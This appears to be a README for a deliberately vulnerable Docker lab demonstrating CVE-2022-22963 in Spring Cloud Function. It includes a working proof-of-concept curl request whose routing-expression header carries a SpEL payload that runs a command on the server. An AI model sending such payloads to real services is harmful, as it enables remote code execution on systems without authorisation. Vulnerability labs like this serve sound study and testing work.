# spring4shell Vulnerable Application(CVE-2022-22963)

Vulnerable Application to [CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)

# CVE-2022-22963 Exploit Demo

https://user-images.githubusercontent.com/57348147/161247749-a481e8ef-fdb0-4062-8ec6-90e1cf7211df.mp4

## Build

```bash
docker pull me2nuk/spring4shell:latest
docker run -it -p 8080:8080 --name=spring4shell me2nuk/spring4shell:latest
```

## POC

```bash
curl -X POST  http://0.0.0.0:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
docker exec -it --user=root spring4shell ls /tmp
```

#### Reference

+ [https://tanzu.vmware.com/security/cve-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)
+ [https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md](https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md)
+ [https://github.com/spring-cloud/spring-cloud-function](https://github.com/spring-cloud/spring-cloud-function)
+ [https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html?m=1](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html?m=1)
+ [https://www.cyberkendra.com/2022/03/spring4shell-details-and-exploit-code.html?m=1](https://www.cyberkendra.com/2022/03/spring4shell-details-and-exploit-code.html?m=1)
+ []()